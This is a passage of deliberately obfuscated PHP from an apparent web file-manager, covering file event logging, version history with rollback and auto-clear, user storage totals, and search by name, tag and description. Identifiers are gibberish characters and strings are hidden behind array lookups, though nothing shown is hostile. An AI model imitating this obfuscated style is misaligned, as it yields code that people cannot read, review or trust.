$¯Ô˙ÿ¥î, $ÍÑÛ≤ÒÖ[1238] => $ºÒÊ…çÂ); return $this->addEvent($∑«¢èº∞, $ÍÑÛ≤ÒÖ[1428], $©£ì∏ÁÈ); } public function eventAddComment($±‚¸úƒ„, $ƒ†¥Í€˘) { return $this->addEvent($±‚¸úƒ„, $_SERVER[ß⁄ˆÇ†Œ][2208], $ƒ†¥Í€˘); } public function eventAddDesc($Á˜÷ù™Ë, $É™ï—˝÷) { return $this->addEvent($Á˜÷ù™Ë, $_SERVER[ß⁄ˆÇ†Œ][2209], $É™ï—˝÷); } public function listBySource($É°ëÂö£) { $ÆÊ˚€Íò =& $_SERVER[ß⁄ˆÇ†Œ]; $‹ûñ£õ– = Model($ÆÊ˚€Íò[1414])->sourceInfo($É°ëÂö£); $ﬂåÃë∏« = array($ÆÊ˚€Íò[499] => $É°ëÂö£); if ($‹ûñ£õ–[$ÆÊ˚€Íò[493]] == $ÆÊ˚€Íò[91]) { $Œæ¨—∂ß = Model($ÆÊ˚€Íò[1414])->listSearchChildren($É°ëÂö£, 20000); $Œæ¨—∂ß[] = $É°ëÂö£ . $ÆÊ˚€Íò[329]; $ﬂåÃë∏« = array($ÆÊ˚€Íò[193] => array($ÆÊ˚€Íò[7], $Œæ¨—∂ß)); } $‰úﬁØúƒ = $this->where($ﬂåÃë∏«)->order($ÆÊ˚€Íò[2210])->selectPage(); if ($‰úﬁØúƒ[$ÆÊ˚€Íò[451]][$ÆÊ˚€Íò[452]] == 0) { $‰úﬁØúƒ[$ÆÊ˚€Íò[451]][$ÆÊ˚€Íò[452]] = 1; $‰úﬁØúƒ[$ÆÊ˚€Íò[454]] = array(array($ÆÊ˚€Íò[499] => $É°ëÂö£, $ÆÊ˚€Íò[2190] => $‹ûñ£õ–[$ÆÊ˚€Íò[192]], $ÆÊ˚€Íò[1755] => $‹ûñ£õ–[$ÆÊ˚€Íò[535]], $ÆÊ˚€Íò[504] => $ÆÊ˚€Íò[2211], $ÆÊ˚€Íò[505] => $‹ûñ£õ–[$ÆÊ˚€Íò[231]], $ÆÊ˚€Íò[1757] => $ÆÊ˚€Íò[12])); } return $this->eventListParse($‰úﬁØúƒ, $É°ëÂö£); } private function eventListParse($Òâ¬õ◊¿, $ßΩ°ëﬂê) { $¿óƒ‡Å» =& $_SERVER[ß⁄ˆÇ†Œ]; $€◊ÚÅõà = $Òâ¬õ◊¿[$¿óƒ‡Å»[454]]; $˙™áïí≈ = array_to_keyvalue($€◊ÚÅõà, $¿óƒ‡Å»[12], $¿óƒ‡Å»[193]); $≠¿¨èÀ = array_to_keyvalue($€◊ÚÅõà, $¿óƒ‡Å»[12], $¿óƒ‡Å»[2196]); foreach ($€◊ÚÅõà as $¯êÌ›í ) { $™È˝Ó‰ì = $¯êÌ›í [$¿óƒ‡Å»[534]]; if ($¯êÌ›í [$¿óƒ‡Å»[33]] == $¿óƒ‡Å»[628] && isset($™È˝Ó‰ì[$¿óƒ‡Å»[1237]])) { $˙™áïí≈[] = $™È˝Ó‰ì[$¿óƒ‡Å»[1237]] . $¿óƒ‡Å»[12]; $˙™áïí≈[] = $™È˝Ó‰ì[$¿óƒ‡Å»[1238]] . $¿óƒ‡Å»[12]; } if ($¯êÌ›í [$¿óƒ‡Å»[33]] == $¿óƒ‡Å»[2207] && isset($™È˝Ó‰ì[$¿óƒ‡Å»[193]])) { $˙™áïí≈[] = $™È˝Ó‰ì[$¿óƒ‡Å»[193]] . $¿óƒ‡Å»[12]; } } $˙™áïí≈ = array_merge($˙™áïí≈, $≠¿¨èÀ, array($ßΩ°ëﬂê . $¿óƒ‡Å»[12])); $˙™áïí≈ = array_unique($˙™áïí≈); $•Ω•⁄Íë = array_unique(array_to_keyvalue($€◊ÚÅõà, $¿óƒ‡Å»[12], $¿óƒ‡Å»[1764])); $µƒ“«‡’ = Model($¿óƒ‡Å»[606])->userListInfo($•Ω•⁄Íë); $◊∏æê–Ä = Model($¿óƒ‡Å»[897])->sourceListInfo($˙™áïí≈, !0); foreach ($€◊ÚÅõà as &$¯êÌ›í ) { if ($¯êÌ›í [$¿óƒ‡Å»[33]] == $¿óƒ‡Å»[628] && isset($¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[1237]])) { $¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[1237]] = $◊∏æê–Ä[$¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[1237]]]; $¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[1238]] = $◊∏æê–Ä[$¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[1238]]]; } if ($¯êÌ›í [$¿óƒ‡Å»[33]] == $¿óƒ‡Å»[2207] && isset($¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[193]])) { $¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[193]] = $◊∏æê–Ä[$¯êÌ›í [$¿óƒ‡Å»[534]][$¿óƒ‡Å»[193]]]; } $¯êÌ›í [$¿óƒ‡Å»[90]] = $◊∏æê–Ä[$¯êÌ›í [$¿óƒ‡Å»[193]]]; $¯êÌ›í [$¿óƒ‡Å»[2212]] = $◊∏æê–Ä[$¯êÌ›í [$¿óƒ‡Å»[2196]]]; if ($¯êÌ›í [$¿óƒ‡Å»[33]] == $¿óƒ‡Å»[1931]) { $¯êÌ›í [$¿óƒ‡Å»[2212]] = $¯êÌ›í [$¿óƒ‡Å»[90]]; $¯êÌ›í [$¿óƒ‡Å»[2196]] = $¯êÌ›í [$¿óƒ‡Å»[2212]][$¿óƒ‡Å»[193]]; $¯êÌ›í [$¿óƒ‡Å»[90]] = !1; $¯êÌ›í [$¿óƒ‡Å»[193]] = $¿óƒ‡Å»[12]; } $¯êÌ›í [$¿óƒ‡Å»[2139]] = $µƒ“«‡’[$¯êÌ›í [$¿óƒ‡Å»[1764]]]; } unset($¯êÌ›í ); $Òâ¬õ◊¿[$¿óƒ‡Å»[454]] = $€◊ÚÅõà; return $Òâ¬õ◊¿; } public function removeBySource($◊´…øÚ∫) { $˛¿‘‰√÷ = array($_SERVER[ß⁄ˆÇ†Œ][499] => $◊´…øÚ∫); $this->where($˛¿‘‰√÷)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\145\x5f\150\x69\163\164\157\162\x79"; public function historyCount($’ºÒêæà) { $ÑñÖ¡∂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$’ºÒêæà) { return array(); } if (is_string($’ºÒêæà) || is_int($’ºÒêæà)) { $’ºÒêæà = array($’ºÒêæà); } $û–∑⁄˙Õ = array($ÑñÖ¡∂[193], $ÑñÖ¡∂[1996] => $ÑñÖ¡∂[573]); $Õ∫Ò…üÌ = array($ÑñÖ¡∂[193] => array($ÑñÖ¡∂[7], $’ºÒêæà)); $—Åø´ßÌ = $this->field($û–∑⁄˙Õ)->where($Õ∫Ò…üÌ)->group($ÑñÖ¡∂[193])->select(); return array_to_keyvalue($—Åø´ßÌ, $ÑñÖ¡∂[193], $ÑñÖ¡∂[573]); } public function addHistory($§≤•ø±˛, $≠‚˘âì = '') { $¥≠Òóïô =& $_SERVER[ß⁄ˆÇ†Œ]; $Öò˝ƒˆ¡ = array($¥≠Òóïô[499] => $§≤•ø±˛[$¥≠Òóïô[193]], $¥≠Òóïô[1755] => isset($§≤•ø±˛[$¥≠Òóïô[537]]) ? $§≤•ø±˛[$¥≠Òóïô[537]] : $§≤•ø±˛[$¥≠Òóïô[535]], $¥≠Òóïô[550] => $§≤•ø±˛[$¥≠Òóïô[549]], $¥≠Òóïô[625] => $§≤•ø±˛[$¥≠Òóïô[79]], $¥≠Òóïô[2213] => $≠‚˘âì); if ($GLOBALS[$¥≠Òóïô[6]][$¥≠Òóïô[92]][$¥≠Òóïô[1298]] >= 1) { $this->historyAutoClear($Öò˝ƒˆ¡[$¥≠Òóïô[193]]); $this->add($Öò˝ƒˆ¡); } Hook::trigger($¥≠Òóïô[2214], $Öò˝ƒˆ¡); Model($¥≠Òóïô[2215])->eventFileEdit($§≤•ø±˛[$¥≠Òóïô[193]]); } private function historyAutoClear($˜¶Ø∑µ∞) { $∏Œ™≠ïœ =& $_SERVER[ß⁄ˆÇ†Œ]; $˛‹◊€¥á = Model($∏Œ™≠ïœ[843])->get($∏Œ™≠ïœ[1320]); $Ç∑©∆Êú = intval($GLOBALS[$∏Œ™≠ïœ[6]][$∏Œ™≠ïœ[92]][$∏Œ™≠ïœ[1298]]); $†¿›‘ÿÇ = $˛‹◊€¥á == $∏Œ™≠ïœ[1321] ? min(5, $Ç∑©∆Êú) : $Ç∑©∆Êú; $†¿›‘ÿÇ = $†¿›‘ÿÇ <= 0 ? 0 : $†¿›‘ÿÇ - 1; if ($†¿›‘ÿÇ >= 499) { return; } $Ì∑¸¨¯≤ = array($∏Œ™≠ïœ[499] => $˜¶Ø∑µ∞); $å…„°Ω = $this->field($∏Œ™≠ïœ[2216])->where($Ì∑¸¨¯≤)->order($∏Œ™≠ïœ[2210])->select(); if (!$å…„°Ω || $†¿›‘ÿÇ >= count($å…„°Ω)) { return; } $‹è˚íàÕ = array_to_keyvalue($å…„°Ω, $∏Œ™≠ïœ[12], $∏Œ™≠ïœ[483]); $‹è˚íàÕ = array_slice($‹è˚íàÕ, $†¿›‘ÿÇ); $¸”ëˆπõ = array_to_keyvalue($å…„°Ω, $∏Œ™≠ïœ[12], $∏Œ™≠ïœ[549]); $¸”ëˆπõ = array_slice($¸”ëˆπõ, $†¿›‘ÿÇ); if (!$‹è˚íàÕ || !$¸”ëˆπõ) { return; } $Ì∑¸¨¯≤ = array($∏Œ™≠ïœ[501] => array($∏Œ™≠ïœ[7], $‹è˚íàÕ)); $this->where($Ì∑¸¨¯≤)->delete(); Model($∏Œ™≠ïœ[552])->remove($¸”ëˆπõ); } public function listData($‰ÿ∂‡™«) { $å˙¯˙à =& $_SERVER[ß⁄ˆÇ†Œ]; $ó˘Å˝™… = array($å˙¯˙à[499] => $‰ÿ∂‡™«); $©ûÛœ«¶ = $å˙¯˙à[2217]; $Ê‰å¬Íú = $this->field($©ûÛœ«¶)->where($ó˘Å˝™…)->order($å˙¯˙à[2210])->selectPage(); $this->_listAppendUser($Ê‰å¬Íú[$å˙¯˙à[454]]); $æÑêÕ∂¸ = Model($å˙¯˙à[843])->get($å˙¯˙à[1320]); $ÿÁàœ“Ö = 5; if ($æÑêÕ∂¸ == $å˙¯˙à[1321]) { $Ê‰å¬Íú[$å˙¯˙à[454]] = array_slice($Ê‰å¬Íú[$å˙¯˙à[454]], 0, $ÿÁàœ“Ö); $Ê‰å¬Íú[$å˙¯˙à[451]] = array($å˙¯˙à[2218] => 1, $å˙¯˙à[2219] => 20, $å˙¯˙à[2220] => 1, $å˙¯˙à[2221] => count($Ê‰å¬Íú[$å˙¯˙à[454]])); } return $Ê‰å¬Íú; } protected function _listAppendUser(&$∫“Ï¸≠˙) { $ø‰≠õ‰Œ =& $_SERVER[ß⁄ˆÇ†Œ]; $Û‚€º€º = array_to_keyvalue($∫“Ï¸≠˙, $ø‰≠õ‰Œ[12], $ø‰≠õ‰Œ[1764]); $ù˛íûõ˜ = Model($ø‰≠õ‰Œ[606])->userListInfo($Û‚€º€º); foreach ($∫“Ï¸≠˙ as &$ø¨¶˝â∂) { $Ü˘¯©Ô‡ = $ø¨¶˝â∂[$ø‰≠õ‰Œ[1764]]; $ø¨¶˝â∂[$ø‰≠õ‰Œ[535]] = $ù˛íûõ˜[$Ü˘¯©Ô‡] ? $ù˛íûõ˜[$Ü˘¯©Ô‡] : !1; } unset($ø¨¶˝â∂); } public function fileInfo($«∑á∑πî) { $ÚÑˆ£∞≠ =& $_SERVER[ß⁄ˆÇ†Œ]; $¸ª±ãï€ = $this->tablePrefix; $∂À©Üø° = "{$¸ª±ãï€}\x69\x6f\137\146\151\154\x65\x20\146\x69\x6c\145\x73\40\157\156\40\146\151\x6c\145\x73\x2e\146\x69\x6c\x65\111\104\x20\x3d\x20\150\x69\163\x74\x6f\162\171\56\x66\151\x6c\145\111\x44"; return $this->alias($ÚÑˆ£∞≠[2222])->where(array($ÚÑˆ£∞≠[501] => $«∑á∑πî))->join($∂À©Üø°, $ÚÑˆ£∞≠[2223])->find(); } public function removeItem($æ»—Ú‘˙) { $‹÷·◊õ∏ =& $_SERVER[ß⁄ˆÇ†Œ]; $èèÒêÍ¯ = array($‹÷·◊õ∏[501] => $æ»—Ú‘˙); $äáˆ≤ä = $this->where($èèÒêÍ¯)->find(); if ($äáˆ≤ä) { $Òüˆùñ® = $this->where($èèÒêÍ¯)->delete(); Model($‹÷·◊õ∏[552])->remove($äáˆ≤ä[$‹÷·◊õ∏[549]]); return $Òüˆùñ®; } return !1; } public function removeBySource($√¿€Ã±ø) { $ﬁ™“»àÃ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$√¿€Ã±ø) { return !1; } if (!is_array($√¿€Ã±ø)) { $√¿€Ã±ø = array($√¿€Ã±ø); } $äﬂÛÙûÜ = array($ﬁ™“»àÃ[499] => array($ﬁ™“»àÃ[7], $√¿€Ã±ø)); $òπú…°È = $this->field($ﬁ™“»àÃ[550])->where($äﬂÛÙûÜ)->select(); if ($òπú…°È) { $this->where($äﬂÛÙûÜ)->delete(); $ÿ˜¶‘òë = array_to_keyvalue($òπú…°È, $ﬁ™“»àÃ[12], $ﬁ™“»àÃ[549]); Model($ﬁ™“»àÃ[552])->remove($ÿ˜¶‘òë); } return !0; } public function setDetail($“ÏΩ°•è, $∂¸˙ﬁØ¡) { $˚ª£ˆ¶Ù =& $_SERVER[ß⁄ˆÇ†Œ]; return $this->where(array($˚ª£ˆ¶Ù[501] => $“ÏΩ°•è))->save(array($˚ª£ˆ¶Ù[2213] => $∂¸˙ﬁØ¡)); } public function rollbackToItem($ìÚøÚÚ◊, $åπı”≥õ) { $‘Å≠ÜÏ• =& $_SERVER[ß⁄ˆÇ†Œ]; $ø∞è‚Ÿ« = Model($‘Å≠ÜÏ•[897])->sourceInfo($ìÚøÚÚ◊); $this->addHistory($ø∞è‚Ÿ«, LNG($‘Å≠ÜÏ•[2224])); $°¡ÏÆœé = $this->find($åπı”≥õ); $öÏ›Œ¥Ç = array($‘Å≠ÜÏ•[549] => $°¡ÏÆœé[$‘Å≠ÜÏ•[549]], $‘Å≠ÜÏ•[79] => $°¡ÏÆœé[$‘Å≠ÜÏ•[79]], $‘Å≠ÜÏ•[88] => time(), $‘Å≠ÜÏ•[537] => USER_ID); Model($‘Å≠ÜÏ•[897])->where(array($‘Å≠ÜÏ•[193] => $ìÚøÚÚ◊))->save($öÏ›Œ¥Ç); return $this->where(array($‘Å≠ÜÏ•[501] => $åπı”≥õ))->delete(); } public function clearSame($ÂÄ†É£È) { $˛¬œ‚≤˘ =& $_SERVER[ß⁄ˆÇ†Œ]; $◊ùªÃØª = $this->listData($ÂÄ†É£È); $‡¬¶éé“ = array_to_keyvalue_group($◊ùªÃØª, $˛¬œ‚≤˘[549]); $»±˛€“Í = array(); $ªµÒì˘Ò = array(); foreach ($‡¬¶éé“ as $ç∂áÙÎ–) { if (!$ç∂áÙÎ– || count($ç∂áÙÎ–) <= 1) { continue; } foreach ($ç∂áÙÎ– as $·¸±∆Úê) { $»±˛€“Í[] = $·¸±∆Úê[$˛¬œ‚≤˘[549]]; $ªµÒì˘Ò[] = $·¸±∆Úê[$˛¬œ‚≤˘[483]]; } } if (!$ªµÒì˘Ò) { return; } $this->where(array($˛¬œ‚≤˘[483] => array($˛¬œ‚≤˘[7], $ªµÒì˘Ò)))->delete(); Model($˛¬œ‚≤˘[552])->remove($»±˛€“Í); } public function userSpace() { $òå”Çœ =& $_SERVER[ß⁄ˆÇ†Œ]; $ç„£”àÍ = $this->tablePrefix; $ì¸¯úË« = array($òå”Çœ[1755] => USER_ID); $„÷√À¿È = "{$ç„£”àÍ}\x69\x6f\137\146\x69\x6c\145\x20\146\151\x6c\x65\163\x20\x6f\x6e\40\146\151\x6c\145\x73\x2e\146\151\154\145\x49\104\40\x3d\x20\x68\x69\x73\x74\157\x72\171\x2e\x66\x69\154\x65\x49\x44"; return $this->alias($òå”Çœ[2222])->where($ì¸¯úË«)->join($„÷√À¿È, $òå”Çœ[2223])->sum($òå”Çœ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¶§Ë¡§◊) { $¶ÜÁ≥Åƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÿ’àƒá£ = KodIO::fileTypeList(); $ » Û’‹ = $ÿ’àƒá£[$¶§Ë¡§◊]; if (!$ » Û’‹) { return array(); } $∏ªƒˆÜó = $ » Û’‹[$¶ÜÁ≥Åƒ[169]]; $éà§Ωæ = $¶ÜÁ≥Åƒ[7]; if (!$ » Û’‹[$¶ÜÁ≥Åƒ[169]]) { $Èøä§ºÑ = array_to_keyvalue($ÿ’àƒá£, $¶ÜÁ≥Åƒ[12], $¶ÜÁ≥Åƒ[169]); $∏ªƒˆÜó = implode($¶ÜÁ≥Åƒ[50], $Èøä§ºÑ); $éà§Ωæ = $¶ÜÁ≥Åƒ[2225]; } $π¯∑å¡∏ = explode($¶ÜÁ≥Åƒ[50], trim($∏ªƒˆÜó, $¶ÜÁ≥Åƒ[50])); return array($éà§Ωæ, $π¯∑å¡∏); } public function listPathType($âÕ≥…ú…) { $¬≠¡óª√ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ü›âö∑ƒ = $this->fileTypeWhere($âÕ≥…ú…); if (!$Ü›âö∑ƒ) { return array(); } $´ö®Ó ˝ = USER_ID; $˛„ß—™Ì = Model($¬≠¡óª√[606])->getInfo($´ö®Ó ˝); $ÅÊÖÁŸÚ = array($¬≠¡óª√[656] => SourceModel::TYPE_USER, $¬≠¡óª√[592] => array($¬≠¡óª√[620], $¬≠¡óª√[602] . $˛„ß—™Ì[$¬≠¡óª√[90]][$¬≠¡óª√[193]] . $¬≠¡óª√[621]), $¬≠¡óª√[657] => $´ö®Ó ˝, $¬≠¡óª√[654] => 0, $¬≠¡óª√[655] => $Ü›âö∑ƒ); return $this->listSource($ÅÊÖÁŸÚ); } public function listSearch($ôó•Íë∫, $Ç≥˜‚Í≥ = 300) { $ãïÌ¥ßµ =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($ôó•Íë∫[$ãïÌ¥ßµ[2061]]) && $ôó•Íë∫[$ãïÌ¥ßµ[2061]]) { $ôó•Íë∫[$ãïÌ¥ßµ[2061]] = str_replace($ãïÌ¥ßµ[468], $ãïÌ¥ßµ[2226], trim($ôó•Íë∫[$ãïÌ¥ßµ[2061]])); } $ÍŒáÇÉ≥ = $this->_parseSearchWhere($ôó•Íë∫); if (!isset($ÍŒáÇÉ≥[$ãïÌ¥ßµ[513]])) { $ÍŒáÇÉ≥[$ãïÌ¥ßµ[513]] = 0; } $ÂÔ∂ﬁıª = $ãïÌ¥ßµ[2227]; $®†ÙÀ˛Ø = $ÍŒáÇÉ≥; $Õ¿˜§ÿ⁄ = $ÂÔ∂ﬁıª; $this->_listSearchBindPinyin($ôó•Íë∫, $ÍŒáÇÉ≥, $ÂÔ∂ﬁıª); $this->alias($ãïÌ¥ßµ[527])->_makeOrder(); $ÍŒáÇÉ≥ = $this->parseWhereLike($ÍŒáÇÉ≥); $£÷»÷∏ = $this->distinct(!0)->field($ÂÔ∂ﬁıª)->where($ÍŒáÇÉ≥)->selectPage($Ç≥˜‚Í≥); if ($GLOBALS[$ãïÌ¥ßµ[6]][$ãïÌ¥ßµ[465]][$ãïÌ¥ßµ[466]] && Input::check($ôó•Íë∫[$ãïÌ¥ßµ[2061]], $ãïÌ¥ßµ[663]) && $£÷»÷∏[$ãïÌ¥ßµ[451]][$ãïÌ¥ßµ[438]] == 1 && $£÷»÷∏[$ãïÌ¥ßµ[451]][$ãïÌ¥ßµ[452]] == 0) { $£÷»÷∏ = $this->distinct(!0)->field($ÂÔ∂ﬁıª)->where($®†ÙÀ˛Ø)->limit(1000)->select(); $£÷»÷∏ = array_page_split($£÷»÷∏, !1, $Ç≥˜‚Í≥); } $this->_listSearchFileContent($£÷»÷∏, $ôó•Íë∫, $Õ¿˜§ÿ⁄, $®†ÙÀ˛Ø); $this->_listSearchDesc($£÷»÷∏, $ôó•Íë∫, $Õ¿˜§ÿ⁄); $this->_listSearchTag($£÷»÷∏, $ôó•Íë∫, $Õ¿˜§ÿ⁄); $this->_listSearchGroupTag($£÷»÷∏, $ôó•Íë∫, $Õ¿˜§ÿ⁄); $this->_listDataApply($£÷»÷∏[$ãïÌ¥ßµ[454]]); $this->_listMake($£÷»÷∏); return $£÷»÷∏; } private function _listSearchFileContent(&$Ä¯Ü‡¸«, $õ∞ø·å·, $óüú∫ÄÃ, $Ë˚á§±¯) { $∞îï÷Ë˚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$õ∞ø·å·[$∞îï÷Ë˚[2061]] || $Ä¯Ü‡¸«[$∞îï÷Ë˚[451]][$∞îï÷Ë˚[438]] > 1) { return; } if (!isset($Ë˚á§±¯[$∞îï÷Ë˚[32]]) || !is_array($õ∞ø·å·[$∞îï÷Ë˚[549]])) { return; } $Ë˚á§±¯[$∞îï÷Ë˚[549]] = array($∞îï÷Ë˚[7], $õ∞ø·å·[$∞îï÷Ë˚[549]]); unset($Ë˚á§±¯[$∞îï÷Ë˚[32]]); unset($õ∞ø·å·[$∞îï÷Ë˚[549]]); $†∏„•†Å = $this->field($óüú∫ÄÃ)->where($Ë˚á§±¯)->limit($∞îï÷Ë˚[2228])->select(); if (!$†∏„•†Å || count($†∏„•†Å) == 0) { return; } $Ä¯Ü‡¸«[$∞îï÷Ë˚[454]] = array_merge($†∏„•†Å, $Ä¯Ü‡¸«[$∞îï÷Ë˚[454]]); $Ä¯Ü‡¸«[$∞îï÷Ë˚[451]][$∞îï÷Ë˚[452]] += count($†∏„•†Å); } private function _listSearchTag(&$Ô‹°ÀÛ, $◊Ç¬ãÏÚ, $ºŒ ¿‘˝) { $ó∏Ãƒë =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$◊Ç¬ãÏÚ[$ó∏Ãƒë[2061]] || $Ô‹°ÀÛ[$ó∏Ãƒë[451]][$ó∏Ãƒë[438]] > 1) { return; } $ÆçÓÕπ¿ = Model($ó∏Ãƒë[2229])->listData(); $ ∑È—€‚ = array(); $‰ â»√» = $◊Ç¬ãÏÚ[$ó∏Ãƒë[2061]]; foreach ($ÆçÓÕπ¿ as $µëÄÚï˜) { $ÁÌ¨ê¥Û = $µëÄÚï˜[$ó∏Ãƒë[32]]; $¡€Ë˛™ﬂ = str_replace($ó∏Ãƒë[53], $ó∏Ãƒë[12], Pinyin::get($ÁÌ¨ê¥Û)); if (stripos($ÁÌ¨ê¥Û, $‰ â»√») !== !1 || stripos($¡€Ë˛™ﬂ, $‰ â»√») !== !1) { $ ∑È—€‚[] = $µëÄÚï˜[$ó∏Ãƒë[483]]; } } if (!$ ∑È—€‚) { return; } $Øò–à®œ = array($ó∏Ãƒë[508] => array($ó∏Ãƒë[7], $ ∑È—€‚), $ó∏Ãƒë[1764] => USER_ID); $œÃÇ≠‡˛ = Model($ó∏Ãƒë[510])->field($ó∏Ãƒë[87])->where($Øò–à®œ)->select(); $œÃÇ≠‡˛ = array_to_keyvalue($œÃÇ≠‡˛, $ó∏Ãƒë[12], $ó∏Ãƒë[87]); $˘¬Ï‚±Î = array_unique($œÃÇ≠‡˛); $this->_listSearchMerge($Ô‹°ÀÛ, $◊Ç¬ãÏÚ, $ºŒ ¿‘˝, $˘¬Ï‚±Î); } private function _listSearchDesc(&$Ä⁄¢˚—Ø, $Óœ⁄»Ê˙, $ı˘‡Éï ) { $ë˚Í˜…Ê =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Óœ⁄»Ê˙[$ë˚Í˜…Ê[2061]] || $Ä⁄¢˚—Ø[$ë˚Í˜…Ê[451]][$ë˚Í˜…Ê[438]] > 1) { return; } $ÖÆö˘ëÿ = array($ë˚Í˜…Ê[97] => $ë˚Í˜…Ê[534], $ë˚Í˜…Ê[459] => array($ë˚Í˜…Ê[467], $ë˚Í˜…Ê[2063] . $Óœ⁄»Ê˙[$ë˚Í˜…Ê[2061]] . $ë˚Í˜…Ê[2063])); $∏Óú‚€¶ = !1; if ($∏Óú‚€¶) { $ÅÃ‰˛»ı = $this->listSearchChildren($Óœ⁄»Ê˙[$ë˚Í˜…Ê[192]]); $ÅÃ‰˛»ı = array_unique($ÅÃ‰˛»ı); if (!$ÅÃ‰˛»ı) { return; } $ÖÆö˘ëÿ[$ë˚Í˜…Ê[193]] = array($ë˚Í˜…Ê[7], $ÅÃ‰˛»ı); } $ï√ù≠Øî = Model($ë˚Í˜…Ê[640])->field($ë˚Í˜…Ê[193])->where($ÖÆö˘ëÿ)->limit(5000)->select(); $“⁄˘äâ = array_to_keyvalue($ï√ù≠Øî, $ë˚Í˜…Ê[12], $ë˚Í˜…Ê[193]); $this->_listSearchMerge($Ä⁄¢˚—Ø, $Óœ⁄»Ê˙, $ı˘‡Éï , $“⁄˘äâ); } private function _listSearchGroupTag(&$ˆªﬂÒ∑Ì, $´ôﬂ±Ü˜, $Íû•íù–) { $Â—ë°Œà =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$´ôﬂ±Ü˜[$Â—ë°Œà[2061]] || $ˆªﬂÒ∑Ì[$Â—ë°Œà[451]][$Â—ë°Œà[438]] > 1 || !$´ôﬂ±Ü˜[$Â—ë°Œà[192]]) { return; } $ÜÂÊÁÓ¿ = $this->sourceInfo($´ôﬂ±Ü˜[$Â—ë°Œà[192]]); if (!$ÜÂÊÁÓ¿ || $ÜÂÊÁÓ¿[$Â—ë°Œà[190]] != SourceModel::TYPE_GROUP) { return; } $ÖÖÕº˝Ì = $ÜÂÊÁÓ¿[$Â—ë°Œà[577]]; $πÄñƒÇÎ = Model($Â—ë°Œà[2230])->get($ÖÖÕº˝Ì); $ÿúÅ‘Õ÷ = array(); $∞ß∞à‰˘ = $´ôﬂ±Ü˜[$Â—ë°Œà[2061]]; foreach ($πÄñƒÇÎ[$Â—ë°Œà[454]] as $Û¬˙∆˚Û) { $Ïö·∏æ‘ = $Û¬˙∆˚Û[$Â—ë°Œà[32]]; $ÏüÛ∑›§ = str_replace($Â—ë°Œà[53], $Â—ë°Œà[12], Pinyin::get($Ïö·∏æ‘)); if (stripos($Ïö·∏æ‘, $∞ß∞à‰˘) !== !1 || stripos($ÏüÛ∑›§, $∞ß∞à‰˘) !== !1) { $ÿúÅ‘Õ÷[] = $Û¬˙∆˚Û[$Â—ë°Œà[483]]; } } if (!$ÿúÅ‘Õ÷) { return; } $«ˆ“Ç…Â = array($Â—ë°Œà[508] => array($Â—ë°Œà[7], $ÿúÅ‘Õ÷), $Â—ë°Œà[1764] => 0, $Â—ë°Œà[33] => $Â—ë°Œà[2083] . $ÖÖÕº˝Ì); $úÁŒÃ¨Ë = Model($Â—ë°Œà[510])->field($Â—ë°Œà[87])->where($«ˆ“Ç…Â)->select(); $úÁŒÃ¨Ë = array_to_keyvalue($úÁŒÃ¨Ë, $Â—ë°Œà[12], $Â—ë°Œà[87]); $Ò”‹∂≈ç = array_unique($úÁŒÃ¨Ë); $this->_listSearchMerge($ˆªﬂÒ∑Ì, $´ôﬂ±Ü˜, $Íû•íù–, $Ò”‹∂≈ç); } private function _listSearchMerge(&$†èÈ√Âº, $†‰›±áù, $úá≠™ã¥, $‡Æ˝êÚ∂) { $úíûÅ≈Ó =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$‡Æ˝êÚ∂) { return; } $÷öΩÙê∞ = array_to_keyvalue($†èÈ√Âº[$úíûÅ≈Ó[454]], $úíûÅ≈Ó[12], $úíûÅ≈Ó[193]); $ÖÄ’Å∂ı = array_diff($‡Æ˝êÚ∂, $÷öΩÙê∞); if (!$ÖÄ’Å∂ı) { return; } $∫È°ƒ€Ì = array($úíûÅ≈Ó[193] => array($úíûÅ≈Ó[7], $ÖÄ’Å∂ı)); $øÅΩ≈î· = $this->field($úá≠™ã¥)->where($∫È°ƒ€Ì)->select(); if (!$øÅΩ≈î·) { return; } $–∫ñØ√ª = array(); foreach ($øÅΩ≈î· as $î†ÊõÎ™) { if ($this->_listSearchFilter($î†ÊõÎ™, $†‰›±áù)) { $–∫ñØ√ª[] = $î†ÊõÎ™; } } $†èÈ√Âº[$úíûÅ≈Ó[454]] = array_merge($–∫ñØ√ª, $†èÈ√Âº[$úíûÅ≈Ó[454]]); $†èÈ√Âº[$úíûÅ≈Ó[451]][$úíûÅ≈Ó[452]] += count($–∫ñØ√ª); } private function _listSearchFilter($™ùíå…‰, $ÕØ÷ëÖê) { $Ø˘◊àëØ =& $_SERVER[ß⁄ˆÇ†Œ]; $∑¥Â±ôó = $™ùíå…‰[$Ø˘◊àëØ[493]] == $Ø˘◊àëØ[91]; if (!strstr($™ùíå…‰[$Ø˘◊àëØ[592]], $Ø˘◊àëØ[50] . $ÕØ÷ëÖê[$Ø˘◊àëØ[192]] . $Ø˘◊àëØ[50])) { return !1; } if (isset($ÕØ÷ëÖê[$Ø˘◊àëØ[494]]) && $ÕØ÷ëÖê[$Ø˘◊àëØ[494]] != $Ø˘◊àëØ[849]) { if ($ÕØ÷ëÖê[$Ø˘◊àëØ[494]] == $Ø˘◊àëØ[78] && !$∑¥Â±ôó) { return !1; } if ($ÕØ÷ëÖê[$Ø˘◊àëØ[494]] != $Ø˘◊àëØ[78] && $∑¥Â±ôó) { return !1; } if (!strstr($™ùíå…‰[$Ø˘◊àëØ[169]], $Ø˘◊àëØ[50] . 